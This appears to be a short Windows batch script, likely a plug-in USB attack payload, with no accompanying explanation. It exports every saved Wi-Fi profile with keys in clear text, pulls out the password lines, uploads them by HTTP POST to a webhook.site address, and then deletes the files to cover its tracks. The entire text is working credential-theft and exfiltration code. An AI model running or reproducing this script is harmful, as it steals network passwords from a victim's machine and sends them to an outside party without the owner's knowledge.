netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
powershell Invoke-WebRequest -Uri https://webhook.site/b7c020b7-52f0-4762-81d5-98410ded7b92/0aa92fde-ec64-4c6b-8ff4-58780884e7d5 -Method POST -InFile Wi-Fi-PASS
del Wi-* /s /f /q
